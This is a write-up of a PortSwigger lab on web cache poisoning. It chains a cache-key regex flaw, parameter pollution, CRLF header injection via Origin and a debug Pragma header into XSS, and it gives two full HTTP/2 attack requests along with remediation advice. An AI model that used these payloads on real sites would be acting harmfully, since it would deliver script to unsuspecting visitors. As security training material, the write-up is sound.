# Lab 12: Cache Key Injection

**Category:** Web Cache Poisoning
**Difficulty:** Expert
**Lab link:** [Cache key injection](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection)

## Overview

Four separate implementation flaws are chained to poison the cache and deliver XSS to a victim visiting the home page:

1. **Flawed cache key regex on `/login`** — `utm_content` is excluded from the cache key, so text appended after `?utm_content=` in the `lang` parameter is unkeyed.
2. **Client-side parameter pollution** — `/login/` reflects the `lang` value unencoded into a `<script src="/js/localize.js?lang=...">` import, allowing extra query parameters to be injected.
3. **Response header injection in `/js/localize.js`** — the endpoint reflects the `Origin` request header into response headers when `cors=1` is set. CRLF sequences in the `Origin` value inject arbitrary headers.
4. **Cache key injection** — `Pragma: x-get-cache-key` reveals the cache key structure, confirming that crafted values align the two poisoned cache entries so the victim's browser is served `alert(1)`.

## Key Concepts

- **`Pragma: x-get-cache-key`:** debug header that exposes the actual cache key the server computes — essential for confirming injection alignment.
- **CRLF injection via Origin:** HTTP/2 header value with `%0d%0a` encoded CRLF injects extra response headers when reflected.
- **utm_content exclusion:** cache strips `utm_content` from the key — text after `?utm_content=` in the `lang` value is effectively unkeyed, allowing parameter smuggling into the import URL.
- **HTTP/2 lowercase headers:** `origin` must be lowercase in HTTP/2; Burp Repeater enforces this.

## Requests

Both requests must be sent over **HTTP/2** in Burp Repeater with `origin` as a **lowercase** header name.

### Request 1 — Poison `/js/localize.js`

```
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Host: <lab>
Pragma: x-get-cache-key
origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
```

The CRLF-encoded `origin` value is reflected into response headers, injecting:
```
Content-Length: 8

alert(1)
```

Repeat until `X-Cache: hit`.

### Request 2 — Poison `/login` redirect

```
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
Host: <lab>
Pragma: x-get-cache-key
```

The `utm_content` exclusion and double-encoded CRLF inject an `origin` value into the cache key that matches the poisoned localize.js entry. The `%23` (`#`) terminates the injected fragment.

Repeat until `X-Cache: hit`.

## Solution

1. Add `Pragma: x-get-cache-key` to requests and confirm `utm_content` is absent from the shown key.
2. Confirm `/login/` page source includes unencoded `lang` in the localize.js import.
3. Confirm `/js/localize.js?cors=1` reflects the `origin` header into response headers.
4. Send Request 1 (HTTP/2, lowercase `origin`) until `X-Cache: hit`.
5. Send Request 2 (HTTP/2) until `X-Cache: hit`.
6. Victim visits `/login?lang=en` → cached redirect → poisoned localize.js cache entry served → `alert(1)` fires.

## Remediation

- Do not exclude query parameters from cache keys via regex — use an allowlist of keyed parameters instead.
- URL-encode dynamic values before reflecting them into JavaScript import URLs.
- Validate and strip CRLF characters from request headers before reflecting them in responses.
- Restrict or remove debug headers like `Pragma: x-get-cache-key` in production.

## Key Takeaways

- `Pragma: x-get-cache-key` is a critical debugging tool for cache key injection attacks.
- CRLF injection through reflected `Origin` headers can completely alter a cached response.
- Double URL-encoding (`%25` = `%`) is needed when injecting into cache key segments that undergo one round of decoding.
- HTTP/2 requires lowercase header names — `origin` not `Origin`.
